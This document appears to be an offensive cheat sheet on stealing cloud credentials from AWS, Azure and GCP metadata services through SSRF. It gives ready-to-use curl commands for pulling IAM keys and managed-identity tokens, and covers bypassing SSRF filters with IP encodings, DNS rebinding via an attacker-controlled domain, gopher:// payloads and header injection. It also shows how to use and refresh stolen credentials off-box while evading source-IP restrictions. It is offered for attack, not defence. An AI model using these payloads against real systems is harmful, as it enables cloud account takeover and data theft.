# Cloud Metadata Endpoints — Full Catalog + SSRF Shaping

## AWS EC2 — IMDS (169.254.169.254, IPv6 fd00:ec2::254)

### IMDSv1 (no auth — any GET primitive works)

| Path | Yields |
|---|---|
| `/latest/meta-data/` | directory listing |
| `/latest/meta-data/iam/security-credentials/` | attached role name |
| `/latest/meta-data/iam/security-credentials/<RoleName>` | `AccessKeyId`, `SecretAccessKey`, `Token`, `Expiration` |
| `/latest/meta-data/iam/info` | instance-profile ARN (account id) |
| `/latest/user-data` | cloud-init / bootstrap script — passwords, keys, internal URLs |
| `/latest/dynamic/instance-identity/document` | accountId, region, instanceId, AZ, image |
| `/latest/meta-data/public-keys/0/openssh-key` | provisioned SSH pubkey |
| `/latest/meta-data/local-ipv4`, `/public-ipv4`, `/hostname` | network position |
| `/latest/meta-data/mac` → `/latest/meta-data/network/interfaces/macs/<mac>/vpc-id`, `subnet-id`, `security-group-ids` | VPC recon |
| `/latest/meta-data/placement/region` | region for API calls |
| `/latest/meta-data/tags/instance/` | instance tags (if enabled) |

### IMDSv2 (session token)

```bash
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
        -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')     # max TTL 6h
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/...
```

- PUT must not carry an `X-Forwarded-For` header (IMDS rejects proxied PUTs).
- Default `HttpPutResponseHopLimit=1`: the PUT's response TTL dies crossing a
  bridge — containers on docker0 can't complete the handshake unless hop limit
  was raised to 2 (common on ECS-on-EC2 and EKS; always try).
- If `HttpTokens=optional` (still common), v1 paths work with no token — always
  try v1 first.
- Check enforcement from stolen creds later: `aws ec2 describe-instances --query
  'Reservations[].Instances[].MetadataOptions'`.

## AWS ECS / Fargate — 169.254.170.2

| Endpoint | Yields |
|---|---|
| `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` | task-role creds (same JSON shape as IMDS). Env var looks like `/v2/credentials/<uuid>` |
| `$AWS_CONTAINER_CREDENTIALS_FULL_URI` + header `Authorization: $(cat $AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE)` | newer full-URI variant (EKS Pod Identity uses `http://169.254.170.23/v1/credentials`) |
| `$ECS_CONTAINER_METADATA_URI_V4` | container metadata |
| `$ECS_CONTAINER_METADATA_URI_V4/task` | task ARN, family, all containers in task |

No env access? The relative URI is a v4 UUID — not brute-forceable, but it leaks
in `/proc/<pid>/environ`, app debug pages (`phpinfo()`, Spring `/actuator/env`,
Laravel debug), error traces, and docker inspect output. SSRF against
`http://169.254.170.2/v2/credentials/<leaked-uuid>` needs NO headers.

On EC2-backed ECS, the EC2 instance role is ALSO reachable at 169.254.169.254
from inside the container (subject to hop limit) — two identities per foothold.

## AWS EKS — IRSA / Pod Identity

```bash
echo $AWS_ROLE_ARN; cat $AWS_WEB_IDENTITY_TOKEN_FILE   # projected JWT, aud=sts.amazonaws.com
aws sts assume-role-with-web-identity --role-arn $AWS_ROLE_ARN \
    --role-session-name s --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE \
    --duration-seconds 3600
```
Also grab `/var/run/secrets/kubernetes.io/serviceaccount/token` for the k8s API
itself (pivot to kubernetes-focused skills).

## AWS Lambda

No IMDS. Creds live in env: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`,
`AWS_SESSION_TOKEN` — any env read (RCE, `/proc/self/environ` file-read) = role creds.

## Azure IMDS (169.254.169.254, GET + `Metadata: true`, rejects redirects)

| Endpoint | Yields |
|---|---|
| `/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | ARM bearer token for the managed identity |
| …`&resource=https://graph.microsoft.com/` | MS Graph token (users, groups, app secrets) |
| …`&resource=https://vault.azure.net` | Key Vault data-plane token |
| …`&resource=https://storage.azure.com/` | Storage token |
| …`&resource=https://database.windows.net/` | Azure SQL token |
| …`&client_id=<guid>` or `&object_id=<guid>` | select among multiple user-assigned identities |
| `/metadata/instance?api-version=2021-02-01` | subscriptionId, resourceGroup, vmId, tags, network |
| `/metadata/instance/compute/userData?api-version=2021-02-01&format=text` | base64 user data |
| `/metadata/attested/document?api-version=2021-02-01` | signed attestation (subscription proof) |

Decode token claims: `oid` (identity object id), `tid` (tenant),
`xms_mirid` (full resource id of the identity — tells you VM + RG + subscription).

**App Service / Functions / Container Apps** (no 169.254.169.254):
```bash
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"
```
SSRF against these needs env leakage for `$IDENTITY_HEADER` (same hunt as the ECS
UUID: environ, debug pages, Kudu console at `https://<app>.scm.azurewebsites.net`).

**Classic bonus**: Azure WireServer `http://168.63.129.16/machine/?comp=goalstate`
(+ follow-up certificates URL with headers `x-ms-version: 2012-11-30`,
`x-ms-guest-agent-public-x509-cert`) can expose VM extension protected settings.

## GCP metadata (metadata.google.internal = 169.254.169.254, header `Metadata-Flavor: Google`)

Base: `http://metadata.google.internal/computeMetadata/v1`

| Path | Yields |
|---|---|
| `/instance/service-accounts/` | attached SA list |
| `/instance/service-accounts/default/token` | `{"access_token":"ya29...","expires_in":3599,"token_type":"Bearer"}` |
| `/instance/service-accounts/default/scopes` | OAuth scopes — `cloud-platform` = unrestricted |
| `/instance/service-accounts/default/email` | SA identity |
| `/instance/service-accounts/default/identity?audience=https://example.com` | signed OIDC JWT (impersonation against services trusting Google OIDC) |
| `/?recursive=true&alt=json` | the entire tree in one response — best single SSRF payload |
| `/instance/attributes/` | `startup-script`, custom keys, `kube-env` (legacy GKE: kubelet creds!) |
| `/instance/attributes/ssh-keys`, `/project/attributes/ssh-keys` | authorized keys (writable with API access → SSH backdoor) |
| `/project/project-id`, `/project/numeric-project-id` | project identity |

Legacy no-header endpoint (try on old instances/GKE):
`/computeMetadata/v1beta1/instance/service-accounts/default/token`.

Cloud Run / Cloud Functions expose the same `/token` path from inside the
container (header still required). GKE Workload Identity: same endpoint, returns
the KSA-mapped GSA token; without it, the NODE SA token (often powerful).

## SSRF shaping matrix

| Primitive | AWS v1 | AWS v2 | ECS | Azure | GCP v1 |
|---|---|---|---|---|---|
| GET URL only (no headers) | YES | no | YES (need URI) | no | no |
| GET + one custom header | YES | no | YES | YES | YES |
| Full request control (RCE/gopher/smuggle) | YES | YES | YES | YES | YES |
| Follows redirects you host | filter bypass only | no (PUT) | filter bypass | IMDS rejects redirect source? No — the *app's* filter is bypassed; Azure IMDS blocks requests with `X-Forwarded-For` and via some proxies | filter bypass; GCP rejects requests with `X-Forwarded-For` |

Header injection corner cases: if the SSRF sink lets you inject CRLF into the
URL/path, you can add `Metadata-Flavor: Google` or `Metadata: true` yourself.
If the app copies client headers upstream (misconfigured proxy, `curl -H @-`
patterns), send the metadata headers in YOUR request to the app.

### IP encodings for 169.254.169.254

```
http://2852039166/            decimal
http://0xA9FEA9FE/            hex
http://0xa9.0xfe.0xa9.0xfe/   dotted hex
http://0251.0376.0251.0376/   octal
http://169.254.43518/         mixed (last two octets merged)
http://[::ffff:a9fe:a9fe]/    IPv6-mapped
http://[fd00:ec2::254]/       AWS IMDS native IPv6
http://[0:0:0:0:0:ffff:169.254.169.254]/
http://metadata.google.internal/   (GCP)
http://instance-data/              (AWS legacy alias, some VPC DNS)
http://169.254.169.254.nip.io/     wildcard-DNS alias (any *.nip.io style service)
attacker DNS: md.example.net A 169.254.169.254
```

### DNS rebinding

Serve TTL-0 answers alternating 203.0.113.10 (passes validation) and
169.254.169.254 (hit on the actual fetch). Works against validate-then-fetch
code that resolves twice. Public helper patterns: run your own authoritative
zone with a round-robin rebind record.

### gopher:// — full request through a URL-only sink

```
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0aContent-Length:%200%0d%0a%0d%0a
```
Two-step: first request mints the token (read it from the response if the sink
echoes bodies), second gopher request sends the GET with
`X-aws-ec2-metadata-token`. Same technique sends `Metadata: true` /
`Metadata-Flavor: Google` through header-less sinks that honor gopher
(libcurl-based fetchers with protocol list unlocked).

## Using stolen credentials off-box

```bash
# AWS
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
# expiry in the JSON; re-steal before Expiration; creds rotate ~hourly

# Azure
TOKEN=eyJ...
curl -s -H "Authorization: Bearer $TOKEN" \
  'https://management.azure.com/subscriptions?api-version=2020-01-01'
az rest --method get --url 'https://management.azure.com/subscriptions?api-version=2020-01-01' \
        --headers "Authorization=Bearer $TOKEN" --skip-authorization-header
# Graph token: curl -H "Authorization: Bearer $GRAPH_TOKEN" https://graph.microsoft.com/v1.0/me

# GCP
export CLOUDSDK_AUTH_ACCESS_TOKEN=ya29....
gcloud projects list
curl -s 'https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=ya29....'   # scopes + SA email
```

If off-box calls are denied (`aws:SourceIp` / VPC-endpoint conditions, Azure
Conditional Access location policies): proxy the CLI through the foothold
(SOCKS over the shell, or run commands on-box) — the credential is valid, only
the network origin is policed.
